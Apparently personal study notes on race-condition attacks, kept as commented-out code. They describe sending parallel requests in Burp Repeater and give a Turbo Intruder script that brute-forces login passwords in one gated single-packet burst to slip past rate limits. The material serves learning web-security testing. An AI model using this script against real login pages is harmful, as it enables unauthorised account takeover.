// Race Conditions
//! Exploiting
//* sending parralel requests
// create a repeater group (+) then select send as a single-packet
//* using turbo extention
// mark the wanted filed with value %s
// you can brute force from clicboard
// def queueRequests(target, wordlists):

// as the target supports HTTP/2, use engine=Engine.BURP2 and concurrentConnections=1 for a single-packet attack
// engine = RequestEngine(endpoint=target.endpoint,
//           concurrentConnections=1,
//              engine=Engine.BURP2
//          )

// assign the list of candidate passwords from your clipboard
// passwords = wordlists.clipboard

// queue a login request using each password from the wordlist
// the 'gate' argument withholds the final part of each request until engine.openGate() is invoked
// for password in passwords:
// engine.queue(target.req, password, gate='1')

// once every request has been queued
// invoke engine.openGate() to send all requests in the given gate simultaneously
// engine.openGate('1')


// def handleResponse(req, interesting):
// table.add(req)

